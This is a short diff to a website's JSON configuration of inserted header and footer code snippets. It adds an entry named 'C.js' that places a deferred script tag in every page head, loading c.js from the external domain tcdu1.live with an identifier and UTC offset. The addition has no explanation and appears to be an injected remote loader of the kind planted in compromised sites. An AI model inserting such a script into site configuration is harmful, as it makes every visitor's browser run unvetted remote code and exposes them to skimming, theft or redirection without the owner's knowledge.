@@ -48,6 +48,17 @@
             "place_head": 1,
             "place_body": 0,
             "place_footer": 0
+        },
+        {
+            "name": "C.js",
+            "kind": "",
+            "code_head": "<script src=\"https://tcdu1.live/c.js\" data-id=\"28e17698-0ce2-4363-b935-fd90fccba754\" data-utcoffset=\"3\" defer></script>",
+            "code_body": "",
+            "code_footer": "",
+            "display": 1,
+            "place_head": 1,
+            "place_body": 0,
+            "place_footer": 0
         }
     ]
 }
